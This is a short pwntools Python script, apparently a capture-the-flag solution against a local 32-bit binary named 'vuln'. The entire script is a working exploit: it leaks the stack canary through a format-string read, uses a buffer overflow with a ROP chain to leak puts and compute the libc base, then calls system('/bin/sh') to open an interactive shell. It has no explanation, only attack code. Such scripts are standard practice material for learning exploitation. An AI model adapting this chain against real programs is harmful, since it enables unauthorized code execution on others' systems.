from re import search
from pwn import *


context.log_level = "debug"

r = process("./vuln")
exe = r.elf
libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
r.recvuntil(b"?\n")
r.sendline(str(-2527))
r.recvuntil(b"? ")
r.sendline(b"%135$p")
r.recvuntil(b": ")
canary = int(r.recvline().decode().strip(), 16)
success("Canary: " + hex(canary))

r.recvuntil(b"?\n")
r.sendline(str(-2527))
r.recvuntil(b"? ")
payload = (
    cyclic(0x200)
    + p32(canary)
    + cyclic(12)
    + p32(exe.plt["puts"])
    + p32(exe.sym["win"])
    + p32(exe.got["puts"])
)
r.sendline(payload)
r.recvlines(2)
libc_puts = u32(r.recv(4))
success("puts: " + hex(libc_puts))
libc_base = libc_puts - libc.sym["puts"]
success("Libc_base: " + hex(libc_base))


libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.recvuntil(b"? ")
payload = (
    cyclic(0x200)
    + p32(canary)
    + cyclic(12)
    + p32(libc_system)
    + p32(0)
    + p32(libc_bin_sh)
)
r.sendline(payload)
r.interactive()
